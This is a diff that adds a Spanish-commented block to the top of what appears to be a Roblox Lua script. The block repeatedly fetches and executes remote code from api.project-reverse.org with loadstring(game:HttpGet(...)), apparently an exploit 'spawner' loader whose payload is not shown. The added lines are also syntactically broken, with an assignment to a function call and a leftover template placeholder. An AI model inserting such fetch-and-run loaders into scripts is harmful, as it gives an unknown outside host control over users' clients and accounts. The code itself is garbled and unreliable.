@@ -1,3 +1,18 @@
+print("Iniciando código principal")
+local success, result = pcall(function()
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImZkYzc3MjI3LWUwODctNDExOS05ZGIwLWQyNmViN2M4NmZlZSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJzYWJzcGF3bmJyYWlucm90In19"))()
+    local loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImZkYzc3MjI3LWUwODctNDExOS05ZGIwLWQyNmViN2M4NmZlZSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJzYWJzcGF3bmJyYWlucm90In19"))() = "print('Hola desde el loadstring!')" -- Reemplaza esto con tu loadstring real
+    return loadstring(loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImZkYzc3MjI3LWUwODctNDExOS05ZGIwLWQyNmViN2M4NmZlZSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJzYWJzcGF3bmJyYWlucm90In19"))())()
+end)
+
+if success then
+    print("Loadstring ejecutado correctamente")
+    print("Resultado:", result)
+else
+    warn("Error al ejecutar el loadstring:", result)
+end
+
+print("Continuando con el código principal")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UIS = game:GetService("UserInputService")
